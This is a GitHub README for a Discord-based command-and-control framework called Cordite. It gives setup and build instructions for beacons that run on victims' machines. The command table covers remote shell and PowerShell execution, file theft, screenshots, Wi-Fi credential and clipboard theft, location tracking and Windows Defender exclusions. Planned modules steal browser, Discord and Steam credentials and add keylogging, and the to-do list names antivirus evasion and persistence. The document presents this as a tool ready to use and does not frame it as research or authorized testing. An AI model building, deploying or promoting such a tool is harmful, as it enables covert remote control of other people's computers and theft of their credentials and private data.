<h1 align="center">Cordite C2</h1>
<p align="center">
  <img src="https://github.com/user-attachments/assets/031c2b48-eb0b-46f9-a5f3-41e8ab66f946" alt="noback - 23-04-2025 21-58-28" />
</p>

Leveraging Discord's API, Cordite is a self-hosting C2 built in C++. Unlike traditional C2 frameworks, Cordite eliminates the need for external infrastructure by using the victim's machine as the C2 host.




### Features:
- **Self-Hosted:** The C2 is managed through Discord, running on the compromised machine while supporting multiple connected agents.
- **Registered Commands:** Cordite utilizes registered slash commands in the Discord UI to issue commands to connected agents.
- **Python Builder:** Using tkinter python library, Cordite has a builder which makes it easy to build beacons and setup discord servers.
- **Modularity:**  Using the builder you can select which moduls / commands you want to include in the beacon.
---

> [!WARNING]
> I recommend using Discord in the browser, because when a beacon connects and registers commands, a `refresh` is required. If you're using the app, this means you'd have to restart Discord.
## Execution Flow

### Pre-Release Version
- **Cordite.exe** (Beacon)  
  - **Callback:**
    - Sends system information (username, hostname, IP, OS, admin status, last check-in time).
    - Updates last check-in time every 20 seconds.
    - Connects to discord over a websocet and listens for slashcommands
    - Takes ~5 seconds to initialize the beacon (refresh Discord after finished).

---

### Screenshots

![423265195-791f825d-30ea-48c1-8f80-c2dea683da0a](https://github.com/user-attachments/assets/89550b01-71d5-4354-a3c5-e8c748618ead)


---
### Builder

![image](https://github.com/user-attachments/assets/ee2ffb48-b9bf-4ec4-bddc-ce1f66332762)

---

## Available Commands

| Command | Description |
|---------|-------------|
| `/cmd agentId:1234 task:'whoami'` | Executes a shell command on the target system. |
| `/cmd-all task:'whoami'` | Executes a shell command on all connected agents. |
| `/download agentId:1234 file:'C:\\windows\\tasks\\test.txt'` | Downloads a specified file from the target machine. |
| `/screenshot agentId:1234` | Captures a screenshot of the victim's screen. |
| `/wifi agentId:1234` | Retrieves saved Wi-Fi credentials. |
| `/upload agentId:1234 destination:'C:\\windows\\tasks\\test.txt'` | Uploads a file to the victim's machine. |
| `/cd agentId:1234 directory:'C:\\'` | Changes the working directory. |
| `/dir agentId:1234` | Lists files in the current directory. |
| `/clipboard agentId:1234` | Retrieves clipboard contents. |
| `/applications agentId:1234` | Lists installed applications. |
| `/sysinfo agentId:1234` | Collects system information. |
| `/ps agentId:1234 option:'all' or 'apps'` | Lists running processes. |
| `/re-register agentId:1234`| Re-register all commands in a beacon in case the agent field is out of sync. |
| `/clean-dead agentId:1234` | Removes dead agents from the beacon chanel. |
| `/defender-exclusion agentId:1234 path:'C:\\'` | Adds a specified path to Windows Defender exclusions. |
| `/powershell agentId:1234 command:'whoami'` | Executes a PowerShell command on the target system. |
| `/kill agentId:1234 process:'notepad.exe'` | Terminates a specified process. |
| `/location agentId:1234` | Retrieves the victim's approximate location. |

---

## Installation - Windows

### Set Up the Discord Bot

#### Create the Bot:

- Visit the [Discord Developer Portal](https://discord.com/developers/applications).
- Click **New Application** in the top-right corner.
- Enter a name for your application (e.g., "Cordite") and click **Create**.

#### Obtain the Bot Token:

- Navigate to the **Bot** tab in the left sidebar.
- Click **Reset Token** if you need a new one, or click **Copy** to save the existing token securely.

#### Invite the Bot to Your Discord Server:

- Go to the **OAuth2** tab in the left sidebar.
- Under the **OAuth2 URL Generator** section, check the **bot** option.
- In the **Bot Permissions** section, select the **Administrator** checkbox (or choose specific permissions as needed).
- Copy the generated URL at the bottom, open it in your browser, and select the server where you want the bot to join.

---

### Clone the Repository and Set Up Your Environment

#### Install Visual Studio with C++ Support:

- Download **Visual Studio Community Edition** (free) from [Microsoft's website](https://visualstudio.microsoft.com/downloads/).
- During installation, select the **Desktop development with C++** workload.

#### Install Python:

- Download and install Python from the official website: [python.org](https://www.python.org/downloads/).

#### Install Git:

- Download and install git: [git-scm.com](https://git-scm.com/downloads).

#### Clone the Repository:
  ```sh
  git clone https://github.com/sweatyrocket/Cordite.git
  ```
#### Navigate to cordite-builder directory:
  ```sh
  cd Cordite\cordite-builder
  ```
#### Install python dependences:
  ```sh
  pip install -r requirements.txt
  ```
#### run main.py:
  ```sh
  python main.py
  ```
### Builder usage:
After launching the builder, you can set up your Discord server under the **"#setup discord"** tab. If you supply your bot token, you can choose to either wipe all channels or simply click **"setup server"**, which will create the required channels. If the channels are already present, their IDs will be fetched into the config tab.

Clicking **"setup server"** is required every time you launch the builder because it does not store data.

Under the **"#beacon generation"** tab, you can generate your beacon. You can choose which optional modules to include in the beacon; any that are not selected will not be compiled into the beacon, making it smaller. Enabling debug mode will show a command prompt popup and display debug information.

Under **"#config"**, you can select the timezone you want the beacons to display, and check or modify any parameters (bot token, channel IDs, app ID).

---

## Modules (Feature Not Yet Implemented)

The following modules are planned but not yet included in this repository. These modules can be deployed by the beacon and executed on the target system:

- **Chrome Data Extractor**: Retrieves cookies, browsing history, and saved login credentials.  
- **Discord Token Extractor**: Extracts tokens from the Discord app, Firefox, and Chrome.  
- **Steam Extractor**: Exports logged in users 2fa ssfn files, logs out user, starts keylogger when steam is started to capture login creds. 
- **Privilege Escalation**: Attempts to elevate the process to administrator privileges.  

These modules are already done but are not yet available in this repository. 

---
## To-Do:

- Code randomization while compiling, making it harder to signature by defender.
- Achieve persistence via Task Scheduler or by backdooring an Electron app.
- Upgrade the builder from Python Tkinter to an Electron app.
  
---
## Contact & Feedback

If you have any questions, feature requests, or feedback—whether it's suggestions for improvements or constructive criticism—feel free to reach out on Discord: **@sweatyrocket**.
